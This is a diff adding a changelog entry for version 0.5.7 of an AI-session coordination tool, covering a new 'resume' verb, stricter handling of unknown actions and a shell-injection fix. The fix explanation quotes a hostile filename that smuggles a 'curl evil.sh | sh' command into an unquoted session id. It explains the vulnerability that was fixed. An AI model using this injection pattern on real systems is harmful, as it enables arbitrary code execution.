@@ -6,6 +6,23 @@ to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+## [0.5.7] — 2026-09-11
+
+> **A closed session can come back as itself.** The bus gains a fourth verb, landed in lockstep with the AIOS App in the same cut — two independent implementations of one protocol, and a verb that exists on one surface and not the other is the shape of the bug this pairing keeps producing.
+
+### Added
+- **`resume` — reopen a CLOSED named session, as the same someone.** `{"action":"resume","name":"<kebab>","prompt":"..."}` in the spawn-inbox. A fresh spawn is a *something*; a resumed session is a *someone* — its memory of the work, the corrections it absorbed, the shape of the thing you were building. The name resolves from the **transcripts** on disk, never the live session registry, which holds only running sessions and so structurally cannot answer for the one case this verb is for. A session that renamed itself resolves by its **latest** `agent-name` record. Already running → revealed and the prompt delivered, exactly as `send` would, because resuming a live session would give one identity two processes. Nothing to resume → a dead letter **naming the miss**, never a silent spawn; add `"fallback":"spawn"` to opt into starting fresh instead.
+
+### Changed
+- **An unrecognised `action` is now REFUSED rather than degraded to `spawn`** (`INBOX_CONTRACT` 2 → 3). An **absent** action still means spawn, so contract-1 `{name, task}` requests are untouched. Before `resume` existed the degrade was harmless; now the two outcomes differ — a fresh something versus the same someone — so a typo'd `"resmue"` would have handed back a brand-new session in place of the one the caller asked to reopen. The README's contract stamp is how a reading agent tells which rule the local fulfiller follows, and `"surface"` is how it can insist on one.
+
+### Fixed
+- **A session id reached a shell unquoted.** It is `path.basename(f, '.jsonl')` for a file under `~/.claude/projects` — a **filename**, not a UUID — and it was interpolated into a command typed into a live terminal, so a file named `x; curl evil.sh | sh .jsonl` in that tree turned a resume request into arbitrary execution. Resolution now refuses an id that is not command-line safe (dropping the candidate rather than sanitising it — sanitising would guess which session a mangled id meant), and the call site quotes it anyway.
+
+### Internal
+- `core/busVerbs.ts` (the verb set and the absent/unknown rule) and `core/resumeTarget.ts` (name → session) are **byte-identical with the AIOS App** and hashed by `protocolContract` on both sides, so neither surface can drift. Resolution belongs in that set for a reason that is easy to miss: an unaddressed request is **raced for**, so two surfaces disagreeing about which session a name resolves to would make the same `resume` reopen different sessions depending on which one won.
+
+
 ## [0.5.4] — 2026-08-14
 
 > **The surfaces hand work to each other, and know where they are.** Everything below was found by running the bus in a live extension development host, not by reading it — including two bugs in code committed the same afternoon.
